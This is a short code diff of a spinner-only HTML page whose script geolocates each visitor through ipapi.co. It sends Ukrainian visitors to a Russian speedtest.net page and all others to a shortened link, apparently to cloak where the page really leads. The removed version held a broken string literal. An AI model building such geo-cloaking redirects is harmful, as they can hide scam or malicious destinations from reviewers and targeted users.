@@ -13,16 +13,17 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
 <div class="spinner"></div>
 <script>
 async function go() {
-  var rules = {
-    'UA': 'https://www.speedtest.net/ru',
-    'pl': 'https://www.speedtest.net/ru',
-    '
-  };
+  var ua = 'https://www.speedtest.net/ru';
   var def = 'https://alicel.ink/alice';
   try {
-    var r = await fetch('https://ipapi.co/json/');
-    var d = await r.json();
-    window.location.replace(rules[d.country_code] || def);
+    var r = await fetch('https://ipapi.co/country/');
+    var country = await r.text();
+    country = country.trim();
+    if (country === 'UA') {
+      window.location.replace(ua);
+    } else {
+      window.location.replace(def);
+    }
   } catch(e) {
     window.location.replace(def);
   }
